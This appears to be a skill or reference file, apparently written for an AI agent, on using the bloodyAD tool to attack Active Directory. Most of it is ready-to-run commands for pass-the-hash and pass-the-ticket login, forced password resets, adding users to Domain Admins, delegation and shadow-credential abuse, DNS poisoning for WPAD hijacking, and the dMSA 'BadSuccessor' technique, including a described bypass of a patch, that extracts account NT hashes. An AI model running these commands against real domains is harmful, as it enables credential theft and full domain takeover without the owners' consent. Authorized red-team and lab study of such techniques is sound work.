---
name: bloodyad
description: "Auth/lab ref: Swiss army knife for Active Directory privilege escalation and object manipulation via LDAP/SAMR. Supports PTH, PTT, Cert auth."
---

# bloodyad

**Goal**: Exploit Active Directory Access Control List (ACL) vulnerabilities and manipulate AD objects without relying on WinRM or native Windows RSAT tools.

## Cognitive Stance

`bloodyAD` is an offensive LDAP/SAMR framework. It acts as the direct execution layer for attack paths identified by BloodHound (GenericAll, WriteDACL, ForceChangePassword, etc). It operates cross-platform and fully supports proxying (SOCKS).

## Core Authentication Patterns

Authentication follows standard Impacket-style formats but with specific arguments. The executable is typically invoked as `bloodyAD`.

```bash
# Cleartext
bloodyAD --host <DC_IP> -d <domain> -u <username> -p <password> <command>

# Pass-The-Hash (NTLM)
bloodyAD --host <DC_IP> -d <domain> -u <username> -p aad3b435b51404eeaad3b435b51404ee:<NTHash> <command>

# Kerberos Pass-The-Ticket
export KRB5CCNAME=/path/to/ticket.ccache
bloodyAD --host <DC_IP> -d <domain> -u <username> -k <command>
```

**Critical gotchas:**

- **Always pass `-u <username>` even with `-k`.** Without it, bloodyAD searches `sAMAccountName=None` and fails silently or returns zero results. The `-k` flag enables Kerberos transport; `-u` still identifies which object to look up.
- **Clock skew**: bloodyAD auto-detects and corrects clock skew up to several hours ("Clock skew detected. Adjusting..."). No manual `faketime` or `ntpdate` needed — unlike impacket tools.
- **LDAP sealing**: bloodyAD uses SASL sign+seal on port 389, which satisfies `strongerAuthRequired`. Use bloodyAD when impacket's raw LDAP bind fails with `strongerAuthRequired` or when LDAPS (636) TLS handshake resets.

## Common Exploitation Workflows

### 1. Object and Attribute Enumeration
If you need to read a specific attribute (e.g., LAPS passwords, LAPS properties, quota sizes).
```bash
bloodyAD -H 10.10.10.10 -d contoso.local -u attacker -p pass get object target_user --attr ms-Mcs-AdmPwd
```

### 2. ForceChangePassword (Reset Target User Password)
If you hold `ForceChangePassword`, `GenericWrite`, or `GenericAll` over a user.
```bash
bloodyAD -H 10.10.10.10 -d contoso.local -u attacker -p pass set password target_user 'NewP@ssw0rd123!'
```

### 3. Group Modification (Add user to Domain Admins)
If you hold `AddMember`, `WriteProperty`, or `GenericAll` over a Group.
```bash
bloodyAD -H 10.10.10.10 -d contoso.local -u attacker -p pass add groupMember 'Domain Admins' target_user
```

### 4. Resource-Based Constrained Delegation (RBCD)
If you hold `GenericAll` or `GenericWrite` over a Computer object, you can set the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
```bash
bloodyAD -H 10.10.10.10 -d contoso.local -u attacker -p pass add rbcd TARGET_COMPUTER '$ATTACKER_COMPUTER'
```
*(After doing this, use `getST.py` from Impacket to request a service ticket).*

### 5. Shadow Credentials (KeyCredentialLink)
If you have `GenericWrite` or `GenericAll` on a user or computer.
```bash
# Injects a KeyCredentialLink. BloodyAD will automatically attempt to PKINIT and get the NTLM hash
bloodyAD -H 10.10.10.10 -d contoso.local -u attacker -p pass add shadowCredentials target_user
```
*(If the automatic unpac fails, BloodyAD saves the certificate. Use `certipy auth -pfx <cert>.pfx` to authenticate manually.)*

### 6. Proxying and Pivoting
BloodyAD relies extensively on standard network sockets and parses environment variables. It works seamlessly through SOCKS proxies via `proxychains`.
```bash
proxychains bloodyAD -H 10.10.10.10 -d contoso.local -u attacker -p pass get object target_user
```
*(Note for Proxychains: ensure `/etc/proxychains4.conf` or `/etc/proxychains.conf` points to your SOCKS port, e.g. Chisel or SSH SOCKS).*

### 7. DNS Record Manipulation
Used to hijack WPAD, internal resources, or relay targets by poisoning `ADIDNS`.
```bash
# Add an A record pointing evil_wpad.contoso.local to 192.168.1.50
bloodyAD -H 10.10.10.10 -d contoso.local -u attacker -p pass add dnsRecord evil_wpad 192.168.1.50
```

### 8. Restore Deleted AD Object

If a target object was soft-deleted (moved to `CN=Deleted Objects`), restore it before attacking.

```bash
# Find deleted object (include deleted objects in search)
bloodyAD --host <DC_IP> -d <domain> -u <username> -p <password> \
  get object "CN=<name>\0ADEL:<guid>,CN=Deleted Objects,DC=<domain>,DC=<tld>"

# Restore (moves object back to its original OU, re-enables it)
bloodyAD --host <DC_IP> -d <domain> -u <username> -p <password> \
  set restore "CN=<name>\0ADEL:<guid>,CN=Deleted Objects,DC=<domain>,DC=<tld>"
```

The GUID (`0ADEL:<guid>`) is part of the CN and must be quoted. Requires Write rights on the deleted object (visible in BloodHound even for deleted objects).

### 9. BadSuccessor (dMSA abuse)

Create a delegated MSA linked to a target account, then extract its credentials via S4U2self.

```bash
# Full (pre-patch / single actor with both CREATE_CHILD on OU and WRITE on target):
bloodyAD --host <DC_IP> -d <domain> -u <username> -p <password> \
  add badSuccessor <new_dmsa_name> \
  -t "CN=<target>,OU=<ou>,DC=<domain>,DC=<tld>" \
  --ou "OU=<ou>,DC=<domain>,DC=<tld>"

# Post-patch split (actor A has CREATE_CHILD on OU, actor B has WRITE on target):
# Step 1 — Actor A: create dMSA, skip writing msDS-Superseded* on target
bloodyAD --host <DC_IP> -d <domain> -u <actor_a> -p <pass_a> \
  add badSuccessor <new_dmsa_name> \
  -t "CN=<target>,OU=<ou>,DC=<domain>,DC=<tld>" \
  --ou "OU=<ou>,DC=<domain>,DC=<tld>" \
  --prepatch

# Step 2 — Actor B: write msDS-Superseded* on target (via GenericWrite / LDAP)
# (bloodyAD set object or PowerShell S.DS.P with Negotiate+Sealing as Actor B)

# Step 3 — Actor A: run S4U2self to steal target's NT hash
badS4U2self "kerberos+ccache://domain\<actor_a>:<actor_a>.ccache@<DC_IP>" \
  "krbtgt/<domain>@<DOMAIN>" "<new_dmsa_name>\$@<DOMAIN>" --dmsa
# Output: target account's RC4/NT hash (only RC4 yielded via dMSA key package)
```

`badS4U2self` is in the `bloodyad` venv (or `kerbad` package in venv-core). Clock skew for `badS4U2self` must be corrected with `sudo date -u -s "<DC_time>"` or `faketime` immediately before running (it does not auto-correct like bloodyAD).

**dMSA Ouroboros (post-patch CVE-2025-53779 bypass):** when the patch validates bidirectional links but not WHO wrote them, an attacker with `CreateChild` + `WriteProperty` on an OU can bypass it by:
1. Create dMSA via `add badSuccessor` (writes both sides of the superseded link).
2. `add genericAll` on the dMSA from the attacking principal.
3. Shadow Credential on the dMSA (`certipy shadow add -account 'dmsa$'`).
4. Write `msDS-GroupMSAMembership` with a self-authorizing SD (the dMSA's own SID + attacker SID get full rights) — this makes the dMSA authorize its own credential retrieval:
```bash
# Get SIDs
bloodyAD ... get object 'dmsa$' --attr objectSid
bloodyAD ... get object attacker --attr objectSid
# Build SD: O:SY D:(A;;0xf01ff;;;<dmsa_sid>)(A;;0xf01ff;;;<attacker_sid>)
# Write it:
bloodyAD ... set object 'dmsa$' msDS-GroupMSAMembership --raw --b64 -v '<base64_sd>'
```
5. Auth as dMSA (`certipy auth -pfx dmsa.pfx`) → ccache.
6. `badS4U2self ... --dmsa` → extracts the superseded account's NT hash from the dMSA key package.

## Anti-Patterns
- Modifying standard Domain Admin passwords or altering live production `Domain Admins` groups is extremely noisy and often forbidden by red-team Rules of Engagement. Prefer Shadow Credentials or RBCD on computer accounts whenever possible.
- Do not skip `-u <username>` when using `-k` — without it bloodyAD fails to identify the authenticated principal.
